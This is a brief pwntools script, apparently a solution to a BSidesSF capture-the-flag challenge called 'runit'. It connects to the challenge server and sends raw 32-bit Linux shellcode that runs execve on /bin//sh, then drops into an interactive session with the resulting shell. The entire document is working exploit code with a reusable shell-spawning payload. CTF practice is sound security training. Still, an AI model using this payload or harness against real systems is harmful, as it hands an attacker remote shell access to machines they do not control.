from pwn import *

#p=process('./runit')
p=remote('runit-5094b2cb.challenges.bsidessf.net',5252)

p.recv(2020)
sleep(1)
p.sendline('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')

p.interactive()
